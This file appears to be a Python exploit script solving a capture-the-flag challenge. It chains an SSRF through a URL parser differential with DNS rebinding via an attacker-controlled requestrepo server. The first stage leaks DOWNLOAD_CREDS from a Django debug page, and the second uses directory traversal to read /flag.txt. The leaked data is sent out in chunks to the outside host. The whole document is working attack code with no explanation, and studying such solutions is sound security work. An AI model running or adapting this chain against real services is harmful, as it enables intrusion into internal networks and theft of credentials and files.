import time
import requests
import threading

import requestrepo
from urllib.parse import urlparse, parse_qs
from base64 import b64encode as b64e
from bs4 import BeautifulSoup


MAX_REQUESTS = 64

client = requestrepo.RequestRepo(host="r.babelo.xyz", port=8000, protocol="http")
token = client.token

print(f"{token = }")

URL = f"{client._Requestrepo__protocol}://{client._Requestrepo__host}:{client._Requestrepo__port}"


def ssrf(url):
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
    protocol = parsed.scheme
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query

    print(f"{protocol = }")
    print(f"{host = }")
    print(f"{port = }")
    print(f"{path = }")

    r = requests.post("http://localhost/api/classify", 
                      # parser differential urllib/requests
                      json={"url": fr"{protocol}://{host}:{port}\@example.com/../..{path}"}, timeout=5)
    print(r.text)
    return r

def leak_download_creds():
    with open("requestrepo-files/index-download-creds.html", "r") as f:
        index_html = f.read().replace("{{REQUESTREPO}}",client.domain)

    json_data = {
        "index.html": {
            "raw": b64e(index_html.encode()),
            "headers": [
                {"header": "Access-Control-Allow-Origin", "value": "*"},
                {"header": "Content-Type", "value": "text/html; charset=utf-8"},
            ],
            "status_code": 200
        },
        "health": {
            "raw": b64e(b"SKIP_ME"),
            "status_code": 200,
            "headers": []
        },
        "crash": {
            "raw": b64e("""<script>alert('halooo')</script>""".encode()),
            "status_code": 200,
            "headers": [
                {"header": "Access-Control-Allow-Origin", "value": "*"},
                {"header": "Content-Type", "value": "text/html; charset=utf-8"},
            ],
        }
    }

    response = requests.post(
        f"{URL}/api/files",
        params={"token": token},
        json=json_data,
    )

    response.raise_for_status()

    client.update_dns([
        requestrepo.DnsRecord(type=0, domain="internal", value="157.180.82.233") # requestrepo ip
    ])

    threading.Thread(target=lambda: ssrf(f"http://127.0.0.1:8002/health?url=http://internal.{client.domain}:8002/")).start()

    time.sleep(2)

    print("waiting requests...")

    failed = False
    for _ in range(4):
        request = client.get_request()
        if request.type == "dns":
            reply = request.reply
            parts = reply.splitlines()[-1].split()
            subd = parts[0]
            resolved = parts[-1]

            if subd.lower().split(".")[0] == "internal":
                if resolved == "127.0.0.1":
                    failed = True
                print(f"Internal resolved to: {resolved}")

        if request.type == "http":
            print(request.raw.decode())

    if failed:
        print("Exploit failed. Run it again.")
        exit(1)


    client.update_dns([
        requestrepo.DnsRecord(type=0, domain="internal", value="127.0.0.1")
    ])


    failed = True

    for i in range(MAX_REQUESTS):
        request = client.get_request()
        if request.type == "dns":
            print(request.reply)
            reply = request.reply
            parts = reply.splitlines()[-1].split()
            subd = parts[0]
            resolved = parts[-1]

            if subd.lower().split(".")[0] == "internal":
                if resolved == "127.0.0.1":
                    failed = False
                print(f"Internal resolved to: {resolved} (2)")
                break

        if request.type == "http":
            print(request.raw.decode())
            
            print(f"Status: {round(i/MAX_REQUESTS*100,2)}%")

    if failed:
        print("No DNS request received. Something went wrong!")
        exit(1)

    print("Waiting for webdriver crash...")

    leak_parts = [""]*128
    for i in range(180):
        request = client.get_request()
        if request.type == "http":
            parsed_url = urlparse(request.url)
            qs = parse_qs(parsed_url.query)
            count = qs.get("count")
            print(request.raw.decode())
            if count and count[0]:
                leak_parts[int(count[0])] = request.raw.decode()
            
            if qs.get("end"):
                print("end leak")
                break
            
        print(f"Status: {round(i/MAX_REQUESTS*100,2)}%")


    leak = ''.join(leak_parts)

    k = "DOWNLOAD_CREDS"

    assert k in leak, "??? Something went wrong during leak: No 'DOWNLOAD_CREDS' string found"


    soup = BeautifulSoup(leak[leak.find(k) + len(k) + 5:], "html.parser")

    assert (creds:=soup.find("pre")), "??? Something went wrong during leak: No <pre> found"

    return creds.text[1:-1] # remove quotes

def get_flag(backend_ip, download_creds):
    with open("requestrepo-files/index-flag.html", "r") as f:
        index_html = f.read().replace("{{REQUESTREPO}}",client.domain).replace("{{DOWNLOAD_CREDS}}", b64e(download_creds.encode()).decode())

    json_data = {
        "index.html": {
            "raw": b64e(index_html.encode()),
            "headers": [
                {"header": "Access-Control-Allow-Origin", "value": "*"},
                {"header": "Content-Type", "value": "text/html; charset=utf-8"},
            ],
            "status_code": 200
        },
        "health": {
            "raw": b64e(b"SKIP_ME"),
            "status_code": 200,
            "headers": []
        }
    }

    response = requests.post(
        f"{URL}/api/files",
        params={"token": token},
        json=json_data,
    )

    response.raise_for_status()

    client.update_dns([
        requestrepo.DnsRecord(type=0, domain="backend", value="157.180.82.233") # requestrepo ip
    ])

    threading.Thread(target=lambda: ssrf(f"http://127.0.0.1:8002/health?url=http://backend.{client.domain}:8001/")).start()

    time.sleep(2)

    print("waiting requests...")

    failed = False
    for _ in range(2):
        request = client.get_request()
        if request.type == "dns":
            reply = request.reply
            parts = reply.splitlines()[-1].split()
            subd = parts[0]
            resolved = parts[-1]

            if subd.lower().split(".")[0] == "backend":
                if resolved == backend_ip:
                    failed = True
                print(f"Internal resolved to: {resolved}")

        if request.type == "http":
            print(request.raw.decode())

    if failed:
        print("Exploit failed. Run it again.")
        exit(1)


    client.update_dns([
        requestrepo.DnsRecord(type=0, domain="backend", value=backend_ip)
    ])


    failed = True

    for i in range(MAX_REQUESTS):
        request = client.get_request()
        if request.type == "dns":
            print(request.reply)
            reply = request.reply
            parts = reply.splitlines()[-1].split()
            subd = parts[0]
            resolved = parts[-1]

            if subd.lower().split(".")[0] == "backend":
                if resolved == backend_ip:
                    failed = False
                print(f"Internal resolved to: {resolved}")
                break

        if request.type == "http":
            print(f"Status: {round(i/MAX_REQUESTS*100,2)}%")

    if failed:
        print("No DNS request received. Something went wrong!")
        exit(1)


    leak_parts = [""]*128
    for i in range(180):
        request = client.get_request()
        if request.type == "http":
            parsed_url = urlparse(request.url)
            qs = parse_qs(parsed_url.query)
            count = qs.get("count")
            if count and count[0]:
                leak_parts[int(count[0])] = request.raw.decode()
            
            if qs.get("end"):
                print("end leak")
                break

    leak = ''.join(leak_parts)

    return leak
        

start = time.time()

backend_ip = "127.0.0.1"

print("Step 2: DNS Rebinding -> read Django debug page -> leak DOWNLOAD_CREDS")
assert (download_creds:=leak_download_creds()), "Error: Unable to retrieve DOWNLOAD_CREDS"
print(f"DOWNLOAD_CREDS: {download_creds}")

print("*"*48)

print("Step 3: DNS Rebinding (again) -> directory traversal on backend -> read /flag.txt")
assert (flag:=get_flag(backend_ip, download_creds)), "Error: Unable to retrieve the flag"
print("*"*48)

print(f"FLAG: {flag}")
print(f"Elapsed: {round(time.time() - start, 2)}s")
